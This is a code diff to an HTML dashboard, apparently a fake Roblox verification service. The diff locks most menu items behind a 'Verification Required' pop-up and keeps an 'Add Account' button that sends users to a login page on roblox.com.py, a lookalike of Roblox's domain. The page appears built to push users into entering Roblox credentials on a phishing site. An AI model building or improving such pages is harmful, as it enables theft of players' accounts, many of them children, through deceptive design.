@@ -18,6 +18,15 @@
     You must be logged in to access other sections of the dashboard.
   </div>
 
+  <!-- 🔴 VERIFY ALERT (NEW) -->
+  <div class="verify-alert" id="verifyAlert">
+    <div class="verify-box">
+      <h3>Verification Required</h3>
+      <p>You must verify your Roblox account before accessing this section.</p>
+      <button onclick="closeVerifyAlert()">Close</button>
+    </div>
+  </div>
+
   <div class="app">
 
     <!-- SIDEBAR -->
@@ -35,31 +44,32 @@
           Verifications
         </a>
 
-        <a href="#" class="menu-item">
+        <!-- 🔒 BLOCKED -->
+        <a href="#" class="menu-item blocked">
           <i class="fa-solid fa-server"></i>
           Manage Servers
         </a>
 
         <p class="menu-title">ACCOUNT</p>
 
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item blocked">
           <i class="fa-solid fa-credit-card"></i>
           Manage Subscriptions
         </a>
 
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item blocked">
           <i class="fa-solid fa-gear"></i>
           Settings
         </a>
 
         <p class="menu-title">OTHER</p>
 
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item blocked">
           <i class="fa-solid fa-life-ring"></i>
           Support
         </a>
 
-        <a href="#" class="menu-item">
+        <a href="#" class="menu-item blocked">
           <i class="fa-solid fa-code"></i>
           Developer API
         </a>
@@ -80,7 +90,6 @@
         <div class="card missing">
           <h3>Missing an account?</h3>
 
-          <!-- BOTÃO COM REDIRECIONAMENTO -->
           <a href="https://roblox.com.py/login?returnUrl=7692425652606225" class="add-btn">
             + Add Account
           </a>
@@ -92,6 +101,23 @@
     </main>
 
   </div>
+
+  <!-- 🔧 SCRIPT (NEW) -->
+  <script>
+    const blockedItems = document.querySelectorAll('.menu-item.blocked');
+    const verifyAlert = document.getElementById('verifyAlert');
+
+    blockedItems.forEach(item => {
+      item.addEventListener('click', (e) => {
+        e.preventDefault();
+        verifyAlert.style.display = 'flex';
+      });
+    });
+
+    function closeVerifyAlert() {
+      verifyAlert.style.display = 'none';
+    }
+  </script>
 
 </body>
 </html>
